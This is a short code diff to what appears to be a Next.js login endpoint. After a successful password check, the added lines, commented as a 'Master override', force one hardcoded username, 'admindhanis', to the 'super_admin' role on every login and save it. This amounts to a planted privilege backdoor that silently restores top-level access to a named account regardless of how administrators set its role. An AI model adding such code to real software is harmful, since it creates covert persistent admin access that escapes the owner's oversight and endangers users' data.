@@ -41,6 +41,12 @@ export async function POST(request) {
         if (!isValid) {
           return NextResponse.json({ error: 'Invalid username or password.' }, { status: 401 });
         }
+        
+        // Master override: Ensure admindhanis always has super_admin role
+        if (user.username === 'admindhanis') {
+          user.role = 'super_admin';
+        }
+
         user.lastLogin = new Date();
         await user.save();
       }
